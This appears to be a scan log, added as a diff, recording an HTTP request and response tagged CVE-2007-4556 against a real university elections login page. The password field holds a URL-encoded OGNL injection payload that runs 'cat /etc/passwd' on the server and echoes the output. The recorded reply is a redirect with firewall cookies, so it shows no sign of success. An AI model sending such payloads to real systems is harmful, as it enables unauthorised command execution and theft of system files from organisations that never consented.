@@ -1,0 +1,31 @@
+[CVE-2007-4556] Dumped HTTP request for https://elections.union.unimelb.edu.au/login.action
+
+
+POST /login.action HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 596
+Accept: */*
+Accept-Language: en
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+username=test&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D
+
+[CVE-2007-4556] Dumped HTTP response https://elections.union.unimelb.edu.au/login.action
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://elections.union.unimelb.edu.au/login.action
+Set-Cookie: visid_incap_3220071=Zw4SRys8QaiY8skOEuf2Ygtyk2gAAAAAQUIPAAAAAAAaEkerFz4t0aJ9A69trLpj; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=m6zfamIwRDAt57arov5JAwtyk2gAAAAAgSE+N1w/IadqCGfsmBgGsA==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 4-3056363-0 0NNN RT(1754493451428 67) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U24
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
